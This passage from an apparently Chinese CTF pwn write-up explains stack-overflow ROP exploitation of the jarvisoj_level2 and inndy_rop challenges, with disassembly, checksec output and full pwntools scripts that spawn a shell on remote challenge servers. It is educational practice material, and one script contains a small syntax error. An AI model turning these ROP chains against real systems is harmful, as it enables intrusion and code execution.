   0               ; fd</span><br><span class="line">call    _read</span><br><span class="line">add     esp, 10h</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 804844B</span><br><span class="line">vulnerable_function endp</span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看符号表发现有<code>/bin/sh</code></p>
</li>
<li><p>可以伪造栈帧，写一个ROP</p>
</li>
</ul>
<p>system_plt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: thunk</span><br><span class="line"></span><br><span class="line">; int system(const char *command)</span><br><span class="line">_system proc near</span><br><span class="line"></span><br><span class="line">command= dword ptr  4</span><br><span class="line"></span><br><span class="line">jmp     ds:off_804A010</span><br><span class="line">_system endp</span><br></pre></td></tr></table></figure>

<ul>
<li>注意这里是直接jmp</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./jarvisoj_level2_x86&#x27;</span></span><br><span class="line">context(binary=file_path, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    p = process(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26776</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048480</span></span><br><span class="line">system_plt =  <span class="number">0x08048320</span>   <span class="comment"># system的plt表,system函数里是包含ret的</span></span><br><span class="line">binsh = <span class="number">0x0804A024</span></span><br><span class="line">nonsense_addr = main_addr <span class="comment"># 因为system函数有ret,所以在system的地址下面需要填充上它的返回地址,具体什么地址无所谓,然后才是参数</span></span><br><span class="line"><span class="comment"># 因为system是通过plt jmp到libc的,没有保存ebp,如果是程序内部call调用函数,需要保存ebp,那么在返回地址上还有一个ebp的位置</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(system_plt) + p32(nonsense_addr) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><blockquote>
<p>ret2text</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>vulnerable_function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public vulnerable_function</span><br><span class="line">vulnerable_function proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -80h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">add     rsp, 0FFFFFFFFFFFFFF80h  ;注意是sub rsp, 80h</span><br><span class="line">mov     edi, offset command ; &quot;echo Input:&quot;</span><br><span class="line">call    _system</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 200h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 4005F6</span><br><span class="line">vulnerable_function endp</span><br></pre></td></tr></table></figure>

<h4 id="64位传参"><a href="#64位传参" class="headerlink" title="64位传参"></a>64位传参</h4><ul>
<li>64位linux的参数传递:一个函数在调用的时候,如果参数个数小于等于6个时,前6个参数时从左至右依次存放于RDI, RSI, RDX, RCX, R8, R9寄存器</li>
<li>这里需要找到一句rop,使得<code>/bin/sh</code>传入rdi</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./jarvisoj_level2_x64&#x27;</span></span><br><span class="line">context(binary=file_path, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    p = process(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25546</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">system_plt =  elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = <span class="number">0x600a90</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>  <span class="comment"># 覆盖栈和rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh)  <span class="comment"># 设置system函数的参数,传入rdi中</span></span><br><span class="line">payload += p64(system_plt)  <span class="comment"># 调用system函数</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwntools（elf）-amp-amp-ROPgadget"><a href="#pwntools（elf）-amp-amp-ROPgadget" class="headerlink" title="pwntools（elf）&amp;&amp;ROPgadget"></a>pwntools（elf）&amp;&amp;ROPgadget</h4><ul>
<li>注意:<ul>
<li>system函数的地址可以直接用pwntools<code>elf.plt[&#39;system&#39;]</code>获得</li>
<li>pop_rdi的地址用ROPgadget<code>ROPgadget --binary jarvisoj_level2_x64 --only &#39;pop|ret&#39; | grep rdi</code>获得</li>
<li><code>/bin/sh</code>还是用IDA看字符串地址</li>
<li>vulnerable_function ret的时候相当于<code>pop rip</code>此时,rsp被调整了,指向返回地址(pop_rdi的地址)的下面那一个栈空间,因此把<code>/bin/sh</code>设置在<code>pop rdi</code>后面</li>
</ul>
</li>
</ul>
<h3 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h3><blockquote>
<p>ret2syscall</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<ul>
<li>开了NX保护</li>
</ul>
<h4 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h4><ul>
<li>因为IDA打开侧栏里有好多函数,<code>file inddy_rop</code>file了一下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inndy_rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=e9ed96cd1a8ea3af86b7b73048c909236d570d9e, not stripped</span><br></pre></td></tr></table></figure>

<ul>
<li>发现是静态编译的,没有办法利用libc的库</li>
<li>查找了一下程序本身也没有system函数,和<code>/bin/sh</code>字符串</li>
</ul>
<p>后门函数overflow</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public overflow</span><br><span class="line">overflow proc near</span><br><span class="line"></span><br><span class="line">var_C= byte ptr -0Ch</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 18h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">push    eax</span><br><span class="line">call    gets</span><br><span class="line">add     esp, 10h</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 804887C</span><br><span class="line">overflow endp</span><br></pre></td></tr></table></figure>

<ul>
<li>有一个gets,可以写rop链</li>
</ul>
<h4 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h4><ul>
<li><p>通过系统调用getshell</p>
<ul>
<li>先通过read系统调用,将<code>/bin/sh\x00</code>写入buff</li>
<li>然后通过execve系统调用来读取</li>
</ul>
</li>
<li><p>具体实现</p>
<ul>
<li>程序是x86程序,查x86系统调用表</li>
<li>read(0,bss + 0x100,8) <code>size_t read(int fildes,void *buf,size_t nbytes);</code><ul>
<li>eax设置成0x3,这个是x86的系统调用号,read函数为0x3号</li>
<li>ebx设置成0,这个是参数fildes(文件描述符)<ul>
<li>0是标准输入</li>
<li>1是标准输出</li>
<li>2是标准错误</li>
</ul>
</li>
<li>ecx设置成bss+0x100的地址</li>
<li>edx设置成8(<code>/bin/sh\x00</code>一共八个字节)</li>
</ul>
</li>
<li>execve(bss+0x100,0,0)<ul>
<li>eax设置成0xb(execve的系统调用号)</li>
<li>ebx设置成bss+0x100</li>
<li>ecx设置成0</li>
<li>edx设置成0</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><ul>
<li>注意<code>int 0x80; ret</code>一句ROPgadget找不到,用ropper找<code>ropper --file inndy_rop --search &quot;int 0x80&quot;</code>看有没有需要的语句</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./inndy_rop&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    r = process(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26240</span>)</span><br><span class="line"></span><br><span class="line">int_80_ret = <span class="number">0x0806f430</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080b8016</span> </span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span> </span><br><span class="line">pop_ecx_ret = <span class="number">0x080de769</span> </span><br><span class="line">pop_edx_ret = <span class="number">0x0806ecda</span> </span><br><span class="line">bss = <span class="number">0x80e9000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>():</span></span><br><span class="line">    </span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p += <span class="string">&#x27;a&#x27;</span>* <span class="number">0xC</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    read(0,bss+0x100,8)</span></span><br><span class="line"><span class="string">    eax = 3</span></span><br><span class="line"><span class="string">    ebx = fd = 0</span></span><br><span class="line"><span class="string">    ecx = buf = bss+0x100</span></span><br><span class="line"><span class="string">    edx = 8 = len(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    p += p32(pop_eax_ret) + p32(<span class="number">0x3</span>)</span><br><span class="line">    p += p32(pop_ebx_ret) + p32(<span class="number">0x0</span>)</span><br><span class="line">    p += p32(pop_ecx_ret) + p32(bss+<span class="number">0x100</span>)</span><br><span class="line">    p += p32(pop_edx_ret) + p32(<span class="number">0x8</span>)</span><br><span class="line">    p += p32(int_80_ret) <span class="comment"># 在设置好参数以后直接调用0x80系统中断</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    execve(bss+0x100,0,0)</span></span><br><span class="line"><span class="string">    eax = 0xb</span></span><br><span class="line"><span class="string">    ebx = buff = bss+0x100</span></span><br><span class="line"><span class="string">    ecx = 0</span></span><br><span class="line"><span class="string">    edx = 0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    p += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">    p += p32(pop_ebx_ret) + p32(bss+<span class="number">0x100</span>)</span><br><span class="line">    p += p32(pop_ecx_ret) + p32(<span class="number">0x0</span>)</span><br><span class="line">    p += p32(pop_edx_ret) + p32(<span class="number">0x0</span>)</span><br><span class="line">    p += p32(int_80_ret)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">shellcode = payload()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"><span class="comment"># sleep(1) 保险起见这里可以加一句</span></span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment"># 记得调用了read函数,需要程序自己输入binsh</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>exp2</p>
<h4 id="ROPdaget（ropchain）"><a href="#ROPdaget（ropchain）" class="headerlink" title="ROPdaget（ropchain）"></a>ROPdaget（ropchain）</h4><ul>
<li>ROPgadget可以自动写静态链接的ropchain<code>ROPgadget --binary inndy_rop --ropchain</code>得到ropchain</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack <span class="comment"># 这个是ROPgadget使用的库</span></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./inndy_rop&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    r = process(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">26240</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>():</span></span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p += <span class="string">&#x27;a&#x27;</span>* <span class="number">0xC</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line">    <span class="comment"># 要做的只是把栈和ebp覆盖掉就行</span></span><br><span class="line">    <span class="comment"># 一下全是复制</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">shellcode = payload()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>自动生成的rop链在调用execve的时候<ul>
<li>先<code>xor eax, eax</code>把eax清零</li>
<li>然后<code>inc eax; ret</code>了0xb次实现了对eax的设置</li>
<li>同理<code>xor</code>也可以设置ecx和edx</li>
</ul>
</li>
</ul>
<h3 id="calculator"><a href="#calculator" class="headerlink" title="calculator"></a>calculator</h3><blockquote>
<p>栈溢出, ret2syscall, system($0), calculator</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -10h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    init</span><br><span class="line">mov     edi, offset asc_401048 ; &quot;  ####    ##   #       ####  #    # #  &quot;...</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset asc_401090 ; &quot; #    #  #  #  #      #    # #    # #  &quot;...</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset asc_4010D8 ; &quot; #      #    # #      #      #    # #  &quot;...</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset asc_401120 ; &quot; #      ###### #      #      #    # #  &quot;...</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset asc_401168 ; &quot; #    # #    # #      #    # #    # #  &quot;...</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset asc_4011B0 ; &quot;  ####  #    # ######  ####   ####  ###&quot;...</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset asc_400F18 ; &quot;=======================================&quot;...</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset aWelcomeToMyCal ; &quot;Welcome to my calculator&quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset aPleaseEnterThe_0 ; &quot;Please enter the number of calculations&quot;...</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, 